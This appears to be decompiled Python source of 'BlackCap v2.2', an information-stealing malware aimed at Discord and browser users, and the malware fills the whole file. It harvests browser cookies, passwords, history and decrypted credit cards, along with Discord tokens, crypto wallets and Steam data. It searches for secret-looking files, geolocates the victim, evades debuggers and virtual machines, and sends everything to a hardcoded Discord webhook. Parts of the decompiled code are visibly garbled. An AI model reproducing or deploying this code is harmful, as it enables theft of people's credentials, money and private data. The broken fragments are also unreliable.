...
# Source timestamp: 2023-01-12 16:53:06 UTC (1673542386)

global Passw  # inserted
global DETECTED  # inserted
global Cookies  # inserted
global cookiWords  # inserted
global blackcapedezFiles  # inserted
...
temp = os.getenv('TEMP')
Passw = []
__config__ = {'yourwebhookurl': 'https://discord.com/api/webhooks/1060400470562197544/hC5cXJ0ndKtvU4_rwb1M8AWpfzg8tIm_iZKtwVHDTmQsnr3lOnVvO4lmO0DK_CNRIIos', 'blackcap_inject_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js', 'hide': 'yes', 'ping': 'yes', 'pingtype': 'everyone', 'fake_error': 'no', 'startup': 'no', 'kill_discord_process': True, 'dbugkiller': True, 'blprggg': ['httpdebuggerui', 'wireshark', 'fiddler', 'regedit', 'cmd', 'taskmgr', 'vboxservice', 'df5serv', 'processhacker', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver']}
infocom = os.getlogin()
vctm_pc = os.getenv('COMPUTERNAME')
r4m = str(psutil.virtual_memory()[0] + 1073741824).split('.')[0]
d1sk = str(psutil.disk_usage('/')[0] + 1073741824).split('.')[0]
BlackCap_Regex = 'https://pastebin.com/raw/f4PM9Dse'
reg_req = requests.get(BlackCap_Regex)
clear_reg = '[\\w-]{24}' + reg_req.text
...
class Functions(object):
    ...
    def cnverttim(time: int or float) -> str:
        try:
            ...
            codestamp = epoch + timedelta(microseconds=time) or False
            return codestamp
        except Exception:
            return None
    ...
    def net_1fo() -> list:
        ...
        if req.status_code == 200:
            ...
            org = data.get('org')
            loc = data.get('loc')
            googlemap = 'https://www.google.com/maps/search/google+map++' % loc or False
        return [ip, city, country, region, org, loc, googlemap]

    @staticmethod
    def fetch_conf(e: str) -> str or bool or None:
...
class bl4ckc4p(Functions):
    ...
    def pingonrunning(self: str) -> str:
        ping1 = {'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png', 'content': '@everyone'}
        ping2 = {'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png', 'content': '@here'}
        if self.pingonrun == 'yes':
            if self.h00ksreg in self.w3bh00k and (self.pingtype == '@everyone' or self.pingtype == 'everyone'):
                httpx.post(self.w3bh00k, json=ping1)
            if (self.pingtype == '@here' or self.pingtype == 'here') and self.h00ksreg in self.w3bh00k:
    ...
    async def init(self):
        ...
        for name, path in self.browsers.items():
            ...
            self.funcs = [self.grbcook, self.gethistez, self.grbpsw2, self.getccez]
    ...
    def grbcook(self, name: str, path: str, profile: str):
        path = path + '\\' % profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        ...
        with open(os.path.join(self.dir, 'Browsers', 'All Creditcards.txt'), 'a', encoding='utf-8') as f:
            for res in cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards').fetchall():
                ...
                if name_on_card and card_number_encrypted!= '':
                    f.write(f'Name: {name_on_card}   Expiration Month: {expiration_month}   Expiration Year: {expiration_year}   Card Number: {self.dcrpt_val(card_number_encrypted, self.masterkey)}\n')
        f.close()
        cursor.close()
        conn.close()
        os.remove(cardvault)
    ...
    def grbhis(self):
        ...
        def xtractwbs3rch(db_cursor):
            ...
            for item in db_cursor.fetchall():
                if item[0]!= '':
                    search_terms = search_terms 6 6 | f'{item[0]}\n'
            return search_terms
        for prof in os.listdir(self.chrmmuserdtt):
            if re.match(self.chrmrgx, prof):
    ...
    def ntfytkn(self):
        ...
        for token in self.tokens:
            ...
            if flags == 4194304:
                badges = badges + 'Active Developer, '
            if badges == '':
                badges = 'None'
            email = j.get('email')
    ...
    def ending(self):
        ...
        for _, __, files in os.walk(self.dir):
            for _file in files:
                files_found = files_found + f'・{_file}\n'
                file_count = file_count + 1
        for tkn in self.tokens:
            tokens = tokens 6 6 | f'{tkn}\n\n'
        fileCount = f'{file_count} Files Found: '
        embed = {'name': 'Blackcap', 'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png', 'embeds': [{'author': {'name': 'Black - Cap v2.2', 'url': 'https://github.com/KSCHdsc', 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'}, '​': f"[Black - Cap has Geo Localised this guy]({self.googlemap})", 'value': f"```fix\n                                IP:᠎ {self.ip.replace(' ', '᠎ ') if self.ip else 'N/A'}, 'inline': True}, '​': {'name': '​', 'value': f"```fix\n                                IP:᠎ {self.org.replace(' ', '᠎ ') if self.org else 'N/A'}{self.country.replace(' ', '᠎ ') if self.country else 'N/A'}{'value': f"inline{self.country.replace(' ', '᠎ ') if self.country else 'N/A'}{'
...
class AntiDebug(Functions):
    ...
    def __init__(self):
        self.processes = list()
        self.bluseurs = ['WDAGUtilityAccount', 'Robert', 'Abby', 'Peter Wilson', 'hmarc', 'patex', 'JOHN-PC', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl']
        self.blpcname = ['DESKTOP-CDLNVOQ', 'BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH']
        self.blhwid = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '79AF5279-16CF-4094-9758-F88A616D81B4', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27']
...
def upload(name, tk=''):
    ...
    if name == 'blackcapedez':
        data = {'content': '', 'embeds': [{'fields': [{'name': 'Interesting files found on user PC:', 'value': tk}], 'author': {'name': 'Black - Cap v2.2', 'url': 'https://github.com/KSCHdsc', 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'}, 'footer': {'text': 'github.com/KSCHdsc'}, 'color': 374276}], 'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png', 'attachments': []}
    ...
    if 'bc_allpasswords' in name:
        ...
        data = {'content': '', 'embeds': [{'fields': [{'name': 'Passwords Found:', 'value': ra}], 'author': {'name': 'Black - Cap v2.2', 'url': 'https://github.com/KSCHdsc', 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'}, 'footer': {'text': 'github.com/KSCHdsc'}, 'color': 374276}], 'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png', 'attachments': []}
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
    if 'bc_allcookies' in name:
        ...
        data = {'content': '', 'embeds': [{'fields': [{'name': 'Cookies Found:', 'value': rb}], 'author': {'name': 'Black - Cap v2.2', 'url': 'https://github.com/KSCHdsc', 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'}, 'footer': {'text': 'github.com/KSCHdsc'}, 'color': 374276}], 'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png', 'attachments': []}
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
...
def GatherAll():
    ...
    browserPaths = [[f'{roaming}/Opera Software/Opera GX Stable', 'opera.exe', '/Local Storage/leveldb', '/', '/Network', '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'], [f'{roaming}/Opera Software/Opera Stable', 'opera.exe', '/Local Storage/leveldb', '/', '/Network', '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'], [f'{roaming}/Opera Software/Opera Neon/User Data/Default', 'opera.exe', '/Local Storage/leveldb', '/', '/Network', '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'], [f'{local}/Google/Chrome/User Data', 'chrome.exe', '/Default/Local Storage/leveldb', '/Default', '/Default/Network', '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'], [f'{local}/Google/Chrome SxS/User Data', 'chrome.exe', '/Default/Local Storage/leveldb', '/Default', '/Default/Network', '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'], [f'{local}/BraveSoftware/Brave-Browser/User Data', 'brave.exe', '/Default/Local Storage/leveldb', '/Default', '/Default/Network', '/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'], [f'{local}/Microsoft/Edge/User Data', 'edge.exe', '/Default/Local Storage/leveldb', '/Default', '/Default/Network', '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn']]
    PathsToZip = [[f'{roaming}/atomic/Local Storage/leveldb', '\"Atomic Wallet.exe\"', 'Wallet'], [f'{roaming}/Exodus/exodus.wallet', 'Exodus.exe', 'Wallet'], ['C:\\Program Files (x86)\\Steam\\config', 'steam.exe', 'Steam'], [f'{roaming}/NationsGlory/Local Storage/leveldb', 'NationsGlory.exe', 'NationsGlory']]
...
def blackcapedez():
    ...
    key_wordsFiles = ['passw', 'mdp', 'motdepasse', 'mot_de_passe', 'login', 'secret', 'account', 'acount', 'paypal', 'banque', 'account', 'metamask', 'wallet', 'crypto', 'exodus', 'discord', '2fa', 'code', 'memo', 'compte', 'token', 'backup', 'seecret']
    wikith = []
    for patt in path2search:
        blackcapedez = threading.Thread(target=blackcapedezFile, args=[patt, key_wordsFiles])
        blackcapedez.start()
...
if not DETECTED:
    ...
    for arg in blackcapedezFiles:
        if len(arg[2])!= 0:
            foldpath = arg[1]
            foldlist = arg[2]
            filetext = filetext + '```diff\n'
            filetext = filetext 6 * f'- {foldpath}\n'
            for ffil in foldlist:
                a = ffil[0].split('/')
                fileanme = a[len(a) + 1]
                b = ffil[1]
                filetext = filetext 6 * f'+ Name: {fileanme}\n+ Link: {b}'
                filetext = filetext + '\n```'
                filetext = filetext 6 0 + '\n'
